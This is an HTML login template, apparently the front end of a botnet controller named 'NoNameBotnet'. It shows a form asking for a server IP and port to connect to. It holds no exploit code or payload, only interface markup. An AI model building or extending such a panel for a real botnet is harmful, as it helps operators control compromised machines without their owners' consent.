{% extends "layout.html" %}
{% block title %}Login{% endblock %}
{% block content %}

<section class="hero is-fullheight">
    <div class="hero-body">
        <div class="container has-text-centered">
            <div class="column is-4 is-offset-4">
                <h1 class="title is-1 has-text-grey">NoNameBotnet</h1>
                <p class="subtitle has-text-grey">Connect to the server</p>
                <div class="box">
                    <form method="post">
                        <div class="field">
                            <div class="control">
                                <input class="input is-large" type="text" name="server_ip" placeholder="Server IP">
                            </div>
                        </div>
                        <div class="field">
                            <div class="control">
                                <input class="input is-large" type="text" name="server_port" placeholder="Port">
                            </div>
                        </div>
                        <input class="button is-success is-large" type="submit" value="Connect">
                    </form>
                    {% if error %}
                        <p class="subtitle has-text-danger has-text-centered"> {{ error }}! </p>
                    {% endif %}
                </div>
            </div>
        </div>
    </div>
</section>

{% endblock %}
